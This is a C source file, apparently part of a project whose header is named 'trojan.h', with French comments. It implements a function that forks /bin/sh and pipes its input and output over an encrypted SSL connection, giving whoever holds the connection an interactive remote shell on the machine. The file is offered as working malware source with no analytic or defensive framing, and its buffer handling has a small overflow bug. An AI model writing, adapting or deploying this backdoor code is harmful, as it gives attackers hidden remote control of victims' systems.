#include "trojan.h"


void handle_shell(SSL* ssl) {

    int to_shell[2]; // envoyer au shell
    int from_shell[2]; // lire depuis le shell
    char buf[1024];

    pipe(to_shell);
    pipe(from_shell);
    
    // Parent : to_shell[1] O=====>O to_shell[0] Child
    // Child  : from_shell[1] O=====>O from_shell[0] Parent
    pid_t pid = fork();
    if (pid == 0) {
        dup2(to_shell[0], 0); // le shell lit sur stdin ce que le parent écrit (le client)
        dup2(from_shell[1], 1); // le shell écrit son stdout dans le pipe vers le parent
        dup2(from_shell[1], 2);  // pareil pour stderr
        close(to_shell[1]);      // on le ferme car le shell n'écrit pas dans ce pipe
        close(from_shell[0]);    // le shell ne lit pas dans ce pipe
        execl("/bin/sh", "sh", NULL);
        exit(1);
    }
    close(to_shell[0]);      // le parent ne lit pas dans ce pipe et écrit dans to_shell[1] redirigé vers stdin du shell
    close(from_shell[1]);    // le parent n’écrit pas la sortie du shell et lit depuis from_shell[0]

    fd_set readfds;
    while (1) {
        int client_fd = SSL_get_fd(ssl);
        FD_ZERO(&readfds);
        FD_SET(client_fd, &readfds);
        FD_SET(from_shell[0], &readfds);
        memset(buf, 0, 1024);

        int max_fd = client_fd;
        if (from_shell[0] > max_fd)
            max_fd = from_shell[0];
        select(max_fd + 1, &readfds, NULL, NULL, NULL);

        if (FD_ISSET(from_shell[0], &readfds)) {
            size_t len = read(from_shell[0], buf, sizeof(buf));
            if (len <= 0)
                break ;
            buf[len] = '\0';
            SSL_write(ssl, buf, len);
            SSL_write(ssl, "$> ", 3);
        }

        if (FD_ISSET(client_fd, &readfds)) {
            size_t readbytes;
            int ret = SSL_read_ex(ssl, buf, 1024, &readbytes);
            if (readbytes <= 0 || !ret)
                break ;
            buf[readbytes] = '\0';
            write(to_shell[1], buf, readbytes);
        }
    }
    waitpid(pid, NULL, 0);
    close(to_shell[1]);
    close(from_shell[0]);
}